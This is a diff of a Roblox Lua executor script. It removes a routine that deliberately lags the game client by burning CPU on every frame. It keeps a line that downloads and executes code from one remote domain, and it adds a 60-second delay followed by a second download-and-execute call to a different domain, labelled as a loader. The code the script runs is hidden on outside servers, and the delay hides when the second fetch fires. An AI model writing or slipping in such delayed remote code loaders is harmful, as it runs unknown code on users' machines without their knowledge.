@@ -1,28 +1,4 @@
-loadstring(game:HttpGet("https://vxezestudio.online/api/scripts/script_rhntYtqtLTB3W/stream/init"))()
---// Real client lag for 15 seconds right after launch, then everything is smooth again. No GUI, no buttons.
-local DURATION = 15      -- seconds of lag
-local BURN_MS  = 110     -- how long every frame is blocked (bigger = heavier lag; 110 ms is about 8 FPS)
+loadstring(game:HttpGet("https://vxezestudio.online/api/scripts/script_NfGdbjfwWhNzy/stream/init"))()
 
-local RunService = game:GetService("RunService")
-
--- running the script again restarts the lag instead of stacking two copies
-if getgenv then
-    local old = getgenv().ZeroRealLagConn
-    if old then pcall(function() old:Disconnect() end) end
-end
-
-local startedAt = os.clock()
-local conn
-conn = RunService.RenderStepped:Connect(function()
-    if os.clock() - startedAt >= DURATION then
-        conn:Disconnect()
-        if getgenv then getgenv().ZeroRealLagConn = nil end
-        return
-    end
-    local t = os.clock()
-    local sink = 0
-    while os.clock() - t < BURN_MS / 1000 do      -- blocks the frame = real stutter
-        sink = sink + math.sqrt(sink + 1)
-    end
-end)
-if getgenv then getgenv().ZeroRealLagConn = conn end
+task.wait(60)
+loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6IjZmMDAxNDBjLTg3MTQtNGMwZS1iYjk4LTAyYTA3OTY5MjA1NSIsImtpbmQiOiJsb2FkZXIifQ"))()
